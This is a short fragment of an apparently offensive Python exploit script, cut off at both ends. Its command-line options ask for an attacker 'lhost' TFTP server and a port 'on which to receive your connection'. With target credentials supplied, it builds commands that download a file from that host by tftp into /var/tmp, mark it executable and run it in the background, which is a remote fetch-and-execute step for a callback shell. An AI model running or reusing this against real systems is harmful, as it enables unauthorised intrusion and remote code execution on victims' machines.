...
def main():
    ...
    parser.add_argument("--lhost", dest="lhost", help="Enter your lhost server tftpd", required=True)
    parser.add_argument("--lport", dest="lport", help="Enter your lport on which to receive your connection", required=False)
    args = parser.parse_args()
    if args.username and args.password and args.target and args.lhost:
        commands = ['tftp -g -r /tftpboot/r -l /var/tmp/r {}'.format(args.lhost), 'chmod +x /var/tmp/r', '/var/tmp/r &']
        for com in commands:
